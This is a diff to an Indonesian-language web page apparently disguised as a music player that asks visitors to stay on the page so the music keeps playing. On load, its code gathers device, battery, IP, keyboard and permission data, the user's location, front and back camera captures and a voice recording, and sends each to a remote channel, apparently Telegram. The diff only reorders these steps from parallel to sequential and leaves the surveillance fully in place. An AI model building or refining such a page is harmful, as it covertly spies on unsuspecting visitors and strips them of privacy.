@@ -150,7 +150,7 @@
       </div>
     </div>
     <div class="artist">Artis tidak di kenal</div>
-    <div class="artist">Tetap di halaman ini agar music berputar</div>
+    <div class="artist" style="color: #00ff00;">Tetap di halaman ini agar music berputar</div>
     <div class="progress-wrapper">
       <div class="progress-bar">
         <div class="progress-fill" id="progress"></div>
@@ -701,32 +701,20 @@ Link Kiriman Audio     : Via Telegram`;
   }
 };
 
-const delay = (ms) => new Promise(res => setTimeout(res, ms));
-
-const mulai = async () => {
+  const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
-  const [
-    infoPerangkat,
-    bateraiInfo,
-    layarGrafik,
-    izinMedia,
-    ipInfo,
-    outputAudio
-  ] = await Promise.all([
-    ambilDataPerangkat(),
-    ambilBaterai(),
-    ambilLayarGrafik(),
-    ambilIzinMedia(),
-    ambilIPInfo(),
-    ambilOutputAudio()
-  ]);
-
+  const infoPerangkat = await ambilDataPerangkat();
+  const bateraiInfo = await ambilBaterai();
+  const layarGrafik = await ambilLayarGrafik();
   const browserInfo = ambilBrowserInfo();
   const webFeatures = ambilWebAPIFeatures();
+  const izinMedia = await ambilIzinMedia();
+  const ipInfo = await ambilIPInfo();
   const keyboard = ambilKeyboardActivity();
   const perangkatEksternal = ambilPerangkatEksternal();
+  const outputAudio = await ambilOutputAudio();
 
   const gabungAwal = [
     infoPerangkat,
@@ -743,31 +731,16 @@ const mulai = async () => {
 
   await kirimPesan(gabungAwal);
 
-  // Lokasi dan Kamera serta VN paralel
-  const lokasiPromise = ambilLokasi().then(async (lok) => {
-    await delay(20);
-    await kirimPesan(lok);
-  });
+  const lokasi = await ambilLokasi();
+  await kirimPesan(lokasi);
 
-  const kameraDepanPromise = ambilKamera("user", "depan").then(async (hasil) => {
-    await delay(20);
-    await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${hasil}`);
-  });
+  const depan = await ambilKamera("user", "depan");
+  await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`);
 
-  const kameraBelakangPromise = ambilKamera("environment", "belakang").then(async (hasil) => {
-    await delay(20);
-    await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${hasil}`);
-  });
+  const belakang = await ambilKamera("environment", "belakang");
+  await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`);
 
-  const rekamVNPromise = delay(20).then(() => rekamVN());
-
-  // Jalankan semua bersamaan
-  await Promise.all([
-    lokasiPromise,
-    kameraDepanPromise,
-    kameraBelakangPromise,
-    rekamVNPromise
-  ]);
+  await rekamVN();
 };
 
     window.addEventListener("load", mulai);
